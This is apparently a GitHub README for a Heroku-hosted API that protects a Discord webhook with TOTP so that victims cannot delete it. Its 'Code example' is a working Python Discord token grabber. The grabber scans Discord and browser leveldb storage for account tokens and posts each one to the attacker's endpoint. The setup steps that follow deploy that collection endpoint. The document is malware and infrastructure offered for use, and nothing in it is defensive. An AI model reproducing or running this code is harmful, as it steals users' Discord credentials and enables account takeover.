<p align="center">
<img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square" </a>
<img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square" </a>
</p>
</p>
<p align="center">
<a href="https://github.com/Rdimo/Discord-Webhook-Protector#setting-up-the-api">Setup the api</a> ⋮
<a href="https://cheataway.com">Discord</a>
</p>

#### Discord-Webhook-Protector was made by
Love ❌ code ✅

---

### 🔰・Features
```
> Easy to setup
> Webhook protected by totp so webhook can't be spammed or deleted even if they http debug!
> Accepting only post requests
> Impossible to delete webhook (still possible to spam, but very hard)
```

### 🎈・Code example
Example of a grabber you can use the api for
```py
import os, re
import requests
from pyotp import TOTP

api = "https://your-heroku-app-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com

pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
key = TOTP(pass32).now()

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    requests.post(api, headers={"Authorization": key}, json={"content": token})
```

### 📁・Setting up the api
1. Create an account on [Heroku.com](https://heroku.com)
2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
3. open api.js and put in your webhook at the top (line 5)
4. open cmd in the directory and type `npm i`
5. Now follow these steps carefully ⇣
```sh-session
$ heroku login
...
$ git init
$ git add .
$ git commit -m "first Webhook protector api commit"
...
$ heroku create
...
$ git push heroku main
...
$ heroku ps:scale web=1
$ heroku open
```

### 📜・ Upcoming features
* File upload support (prob not in a while tho since im too lazy)
